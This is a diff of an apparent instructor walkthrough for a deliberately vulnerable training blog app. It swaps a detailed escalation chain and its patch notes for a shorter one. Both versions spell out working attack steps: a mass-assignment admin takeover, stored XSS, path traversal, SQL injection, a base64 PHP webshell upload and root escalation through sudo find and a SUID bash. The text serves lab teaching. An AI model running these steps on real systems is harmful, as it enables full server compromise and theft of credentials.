+**Expected output:**
+```
+uid=33(www-data) euid=0(root)
 ```
 
-#### Full Patch
-
-```dockerfile
-# ✅ AFTER (remove both lines — no sudoers, no SUID)
-# (simply delete the above RUN commands from the Dockerfile)
-```
-
-**Principle of least privilege:** the web process should never run commands as root. Use unprivileged users with no sudo access.
-
-#### Patch Validation
-
-```bash
-# From webshell: sudo should fail
-sudo -l
-# Expected: sudo: command not found (or permission denied)
-
-# SUID bash should not exist
-ls -la /tmp/rootbash
-# Expected: No such file or directory
-```
+The effective UID is 0 — root access via the SUID bit.
 
 ---
 
-## Hidden Routes
-
-None appear in menus or links. Discoverable with `gobuster`, `ffuf`, or `dirsearch`.
-
-| Route | Code | Content | Patch |
-|---|---|---|---|
-| `/backup` | 200 OK | Editor and admin credentials in plaintext | Protect with auth + admin check |
-| `/debug` | 200 OK | App version, PHP, DB driver, counts | Protect with auth + admin check |
-| `/old` | 302 | Redirects to `/` | No patch needed (decoy) |
-| `/internal` | 403 | Forbidden | No patch needed (decoy) |
-| `/admin` | 302 | Redirects to `/dashboard` | No patch needed (safe redirect) |
-
-**Student enumeration:**
-
-```bash
-gobuster dir -u http://vblog.local \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -x php,txt,html
-```
-
----
-
-## Hidden Subdomain
-
-**URL:** `http://dev.vblog.local`
-
-**Requirement:** Add to `/etc/hosts`:
-```
-127.0.0.1  dev.vblog.local
-```
-
-**Content:**
-
-| Page | Description |
-|---|---|
-| `/` (index.html) | Status panel: environment, framework, DB, quick endpoints |
-| `/api-docs.html` | Full internal API documentation with vulnerability notes and curl examples |
-| `/logs.html` | App logs with DB connection string, mass assignment traces, and XSS hints |
-
-**No authentication** — Panel requires no login (intentional vulnerability).
-
-**Subdomain enumeration:**
-
-```bash
-gobuster vhost -u http://vblog.local \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  --append-domain
-```
-
-**Useful information in `/logs.html`:**
-- DB connection string: `postgresql://vblog_adm:uireh34t34@postgresql:5432/vblog`
-- Mass assignment traces: `PUT /api/update/user/53 body={"role":"admin"}`
-- XSS hint in comments
-
----
-
-## Full Escalation Chain
+## Full Escalation Chain (Summary)
 
 ```
-Phase 0 — Reconnaissance (anonymous)
-│
-│  1. gobuster dir → /backup, /debug, /old, /internal
-│  2. gobuster vhost → dev.vblog.local
-│  3. curl /backup → editor01 + admin + DB credentials
-│  4. curl /debug → PHP version, driver, counts
-│  5. ffuf /api/users/FUZZ → user ID enumeration (IDOR)
-│  6. curl -I / → no X-Frame-Options, no CSP, no security headers
-│
-▼
-Phase 1 — Registered user
-│
-│  1. POST /api/login with editor01/editor01pass (from /backup)
-│  2. GET /api/me → role: "editor"
-│
-▼
-Phase 2 — Escalation to Admin (Mass Assignment)
-│
-│  1. PUT /api/update/user/{my_id} -d '{"role":"admin"}'
-│  2. GET /api/me → role: "admin"  ✓ Escalation successful
-│  3. GET /dashboard → access granted (broken access control)
-│
-▼
-Phase 3 — XSS Exploitation + Internal Access
-│
-│  1. POST /api/create/comment with <script>…</script> payload
-│  2. XSS executes when any user visits the post
-│  3. Cookie stealable (HttpOnly=false) → session impersonation
-│  4. /etc/hosts: 127.0.0.1 dev.vblog.local
-│  5. GET http://dev.vblog.local/logs.html → full DB connection string
-│  6. psql -h localhost -p 5432 -U vblog_adm -d vblog → DB compromised
-│
-▼
-Phase 4 — Admin Panel: Path Traversal + SQLi
-│
-│  1. GET /api/admin/file?path=.env → APP_KEY + credentials in plaintext
-│  2. GET /api/admin/file?path=../../etc/passwd → system users
-│  3. GET /api/admin/stats?filter=' → SQL error, PostgreSQL confirmed
-│  4. sqlmap → full dump of users table with password hashes
-│
-▼
-Phase 5 — RCE via File Upload
-│
-│  1. echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > shell.php
-│  2. POST /api/admin/upload -F file=@shell.php → URL: /avatars/shell.php
-│  3. GET /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)
-│
-▼
-Phase 6 — Escalation to root
-│
-│  1. sudo -l → (root) NOPASSWD: /usr/bin/find
-│  2. sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
-│     → uid=0(root)  ✓ ROOT OBTAINED
-│  Or:
-│  3. /tmp/rootbash -p -c id → euid=0(root)  ✓ SUID bash
+Phase 0 — Recon (anonymous)
+  1. Browser: http://localhost → explore the app
+  2. gobuster dir → finds /backup, /debug
+  3. Browser: http://localhost/backup → editor + admin + DB credentials
+  4. curl /api/users/1..55 → IDOR, find admin (id 52)
+  5. gobuster vhost → dev.vblog.local
+  6. Add to /etc/hosts → http://dev.vblog.local/logs.html
 
+Phase 1 — Register
+  1. Browser: http://localhost/signup → create account
+  2. curl /api/me → get your user ID and current role
+
+Phase 2 — Admin (Mass Assignment)
+  1. PUT /api/update/user/{id} -d '{"role":"admin"}'
+  2. curl /api/me → role: admin ✓
+  3. Browser: http://localhost/dashboard → access granted
+
+Phase 3 — XSS + Internal Panel
+  1. Browser: post <script>alert(document.cookie)</script> as a comment
+  2. Reload post → cookie appears in alert
+  3. Browser: http://dev.vblog.local/logs.html → DB string + traces
+
+Phase 4 — Admin API
+  1. curl /api/admin/file?path=../../etc/passwd → Path Traversal
+  2. curl /api/admin/stats?filter=' → SQL error (PostgreSQL)
+  3. sqlmap → full users table dump
+
+Phase 5 — RCE
+  1. Create shell.php with passthru payload
+  2. curl -F file=@shell.php /api/admin/upload → /avatars/shell.php
+  3. curl /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)
+
+Phase 6 — root
+  1. shell: sudo -l → NOPASSWD: /usr/bin/find
+  2. shell: sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
+  3. cat /tmp/pwned → uid=0(root) ✓
 ```
-
----
-
-## Patch Summary
-
-| # | Vuln | OWASP | File | Action |
-|---|---|---|---|---|
-| 1 | IDOR | A01 | routes/api.php | Add `middleware('auth')` |
-| 2 | Mass Assignment | A04 | UserController.php | Validate input, exclude `role` from fillable or use `only()` |
-| 3 | Broken Access Control | A01 | routes/web.php | Check `role === 'admin'` in /dashboard |
-| 4 | Insecure Cookies | A05 | config/session.php | `HttpOnly=true`, `SameSite=lax` |
-| 5 | Missing Headers | A05 | nginx/server.conf | Uncomment security headers |
-| 6 | Stored XSS | A03 | comment.blade.php | Change `{!! !!}` to `{{ }}`; `strip_tags()` in controller |
-| 7 | Info Disclosure | A05 | routes/web.php | Protect `/backup`, `/debug` with `auth` + admin check |
-| 8 | Path Traversal | A01/A05 | AdminController.php | `realpath()` + directory allowlist |
-| 9 | SQL Injection | A03 | AdminController.php | Bindings with `?` in `DB::select()` |
-| 10 | File Upload | A04/A05 | AdminController.php | Validate `mimes:`, random filename; nginx blocks `.php` in avatars |
-| 11 | Root Privesc | A06 | Dockerfile | Remove sudoers entry and SUID bash |
